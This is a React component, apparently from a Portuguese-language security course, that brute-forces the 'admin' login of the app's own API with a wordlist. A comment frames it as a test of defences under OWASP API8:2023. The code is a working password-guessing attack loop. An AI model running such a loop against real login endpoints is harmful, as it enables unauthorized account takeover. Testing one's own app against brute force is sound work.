import React from 'react'
import wordlist from '../data/wordlist'
import myfetch from '../lib/myfetch'

let stop = false

export default function BruteForce() {
  const [log, setLog] = React.useState([])

  async function tryPassword(password) {
    try {
      await myfetch.post('/users/login', { username: 'admin', password })
      return 'OK'
    }
    catch (error) {
      return error.message
    }
  }
  
  async function handleStartClick(event) {
    event.target.disabled = true
    stop = false
    for(let i = 0; i < wordlist.length; i++) {
      if(stop) break
      let result = await tryPassword(wordlist[i])
      if(result === 'OK') {
        setLog(`SENHA ENCONTRADA, tentativa nº ${i}: ${wordlist[i]}` )
        stop = true
        break
      }
      else {
        setLog(`Tentativa nº ${i} (${wordlist[i]}) => ${result}`)
      }
      setTimeout(() => setLog('-- parado --'), 250)
    }
    event.target.disabled = false
  }

  return (
    <>
      <h1>Ataque de força bruta no <em>login</em></h1>
      <div style={{
        display: 'flex',
        justifyContent: 'space-around'
      }}>
        <button onClick={handleStartClick}>
          Iniciar
        </button>
        <button onClick={() => stop = true}>
          Parar
        </button>
      </div>
      <div style={{ fontFamily: 'monospace' }}>
        {log}
      </div>
    </>
  )
}

  /* 
    API8:2023 – Má configuração de segurança
    Esta página em si e suas validações de segurança contra ataques de força bruta,
    realizados passando uma lista de palavras comuns para verificação deste tipo de ataque, 
    ajudam a fortalecer a segurança da aplicação e impedir que hackers consigam acessar o sistema
    por esse meio e obter informações sigilosas.
  */
